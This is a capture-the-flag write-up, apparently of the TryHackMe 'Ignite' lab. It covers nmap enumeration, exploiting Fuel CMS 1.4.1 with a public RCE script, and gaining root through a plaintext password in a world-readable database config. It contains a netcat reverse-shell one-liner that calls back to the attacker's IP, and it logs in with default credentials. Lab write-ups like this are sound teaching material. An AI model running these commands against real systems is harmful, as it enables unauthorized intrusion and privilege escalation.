# Ignite

## Enumeration

`sudo nmap -vv -sV -sC 10.10.115.230 -oA ignite`

```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
```
Fuel CMS is installed on this server. It is currently not configured. Default creds (admin:admin) can be used to log into the CMS admin panel. Docs reveal it is at least version 1.4. 

## Exploitation

Exploitation involves using a python2 exploit that allows for remote code execution on the server via fuelcms. This provides access as `www-data`. The remote host IP needs to be changed in the discovered exploit. 

`$ searchsploit fuelcms`

```
drsh0@dnetbook:~/Documents/thm/ignite$ searchsploit fuelcms
-------------------------------------------------------------- ---------------------------------
 Exploit Title                                                |  Path
-------------------------------------------------------------- ---------------------------------
fuelCMS 1.4.1 - Remote Code Execution                         | linux/webapps/47138.py
-------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

drsh0@dnetbook:~/Documents/thm/ignite$ searchsploit -m linux/webapps/47138.py

drsh0@dnetbook:~/Documents/thm/ignite$ python2 47138_2.py
cmd:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.9.240 4444 >/tmp/f"

```
This listener was set up prior to the remote command being executed to allow a reverse shell to be created.
```
drsh0@dnetbook:~$ nc -nlvp 4444
listening on [any] 4444 ...
```

A reverse connection is successfully created. We have access as the `www-data` user and are able to read `user.txt` in the home directory. 



## Privilege Escalation

Let's first upgrade to a TTY shell. 

`python -c 'import pty; pty.spawn("/bin/bash")'`

There are a lot of options to consider when trying to privesc. In this scenario, it is safe to assume that this CMS system has not been properly set up by the admin/s. The info page on the web server provides some information about a database php config file. It would be interesting to see if we can read that as `www-data`:

`find / -name "*/config/database.php" 2>/dev/null`

It's there and readable by the world!

`cat <snip>/config/database.php`

The above was configured using a root account and the password was available in plain text. 

```bash
su root -
# enter the discovered password
cat root.txt
# PROFIT!
```

:::danger
:skull_and_crossbones: root access obtained
:::

## TODO
- [ ] correlate the above to ATT&CK / kill chain analysis
- [ ] IR and detection POV

{%hackmd theme-dark %}